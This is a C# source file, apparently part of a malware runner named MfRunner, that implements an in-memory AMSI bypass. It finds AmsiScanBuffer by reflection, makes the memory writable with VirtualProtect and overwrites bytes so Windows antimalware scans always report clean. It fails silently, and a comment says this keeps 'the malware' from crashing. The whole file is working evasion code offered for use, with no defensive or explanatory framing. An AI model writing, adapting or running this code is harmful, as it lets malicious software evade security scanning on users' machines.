using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace MfRunner
{
    /// <summary>
    /// Global AMSI Bypass implementation - performs AMSI bypass by patching amsi.dll in memory
    /// Based on: https://github.com/Chainski/GlobalAMSIBypass
    /// Credit: Chainski
    /// 
    /// This implementation modifies the AmsiScanBuffer function in amsi.dll to always return 
    /// AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
    /// </summary>
    internal partial class Program
    {
        private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);
        private delegate IntPtr GetModuleHandleDelegate(string lpModuleName);
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        /// <summary>
        /// Performs global AMSI bypass by patching AmsiScanBuffer in memory
        /// This implementation uses reflection and dynamic delegates to locate and patch the function
        /// </summary>
        public static void GlobalAMSIBypass()
        {
            try
            {
                // Get UnsafeNativeMethods type from System.dll
                var systemAssembly = AppDomain.CurrentDomain.GetAssemblies();
                Type unsafeNativeMethodsType = null;
                
                foreach (var assembly in systemAssembly)
                {
                    if (assembly.GlobalAssemblyCache && 
                        assembly.Location.Split('\\')[assembly.Location.Split('\\').Length - 1].Equals("System.dll"))
                    {
                        unsafeNativeMethodsType = assembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
                        break;
                    }
                }

                if (unsafeNativeMethodsType == null)
                    return;

                // Get GetModuleHandle method
                MethodInfo getModuleHandleMethod = unsafeNativeMethodsType.GetMethod("GetModuleHandle");
                if (getModuleHandleMethod == null)
                    return;

                // Get GetProcAddress method
                MethodInfo[] getProcAddressMethods = unsafeNativeMethodsType.GetMethods();
                MethodInfo getProcAddressMethod = null;
                foreach (var method in getProcAddressMethods)
                {
                    if (method.Name == "GetProcAddress")
                    {
                        getProcAddressMethod = method;
                        break;
                    }
                }

                if (getProcAddressMethod == null)
                    return;

                // Get handle to amsi.dll
                IntPtr amsiModule = (IntPtr)getModuleHandleMethod.Invoke(null, new object[] { "amsi.dll" });
                if (amsiModule == IntPtr.Zero)
                    return;

                // Get address of AmsiScanBuffer
                string functionName = "AmsiScanBuffer";
                IntPtr amsiScanBufferAddr = (IntPtr)getProcAddressMethod.Invoke(null, new object[] { amsiModule, functionName });
                if (amsiScanBufferAddr == IntPtr.Zero)
                    return;

                // Calculate patch address (offset +33 bytes as per original implementation)
                long patchAddressLong = (long)amsiScanBufferAddr + 33;
                IntPtr patchAddress = new IntPtr(patchAddressLong);

                // Get VirtualProtect function
                IntPtr kernel32 = (IntPtr)getModuleHandleMethod.Invoke(null, new object[] { "kernel32.dll" });
                IntPtr virtualProtectAddr = (IntPtr)getProcAddressMethod.Invoke(null, new object[] { kernel32, "VirtualProtect" });
                
                if (virtualProtectAddr == IntPtr.Zero)
                    return;

                // Create delegate for VirtualProtect
                VirtualProtectDelegate virtualProtect = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(
                    virtualProtectAddr, 
                    typeof(VirtualProtectDelegate)
                );

                // Change memory protection to PAGE_EXECUTE_READWRITE (0x40)
                uint oldProtect = 0;
                if (!virtualProtect(patchAddress, 3, 0x40, out oldProtect))
                    return;

                // Apply patch: xor ebx, ebx (bytes: 48 31 DB / 0x48, 0x31, 0xDB in hex)
                // This makes the function return 0 (AMSI_RESULT_CLEAN)
                byte[] patchBytes = new byte[] { 0x48, 0x31, 0xDB }; // xor ebx, ebx
                Marshal.Copy(patchBytes, 0, patchAddress, 3);

                // Restore original memory protection to PAGE_EXECUTE_READ (0x20)
                virtualProtect(patchAddress, 3, 0x20, out oldProtect);

                // Global AMSI bypass completed successfully
            }
            catch
            {
                // Silently fail if bypass doesn't work
                // This prevents the malware from crashing if AMSI bypass fails
            }
        }
    }
}
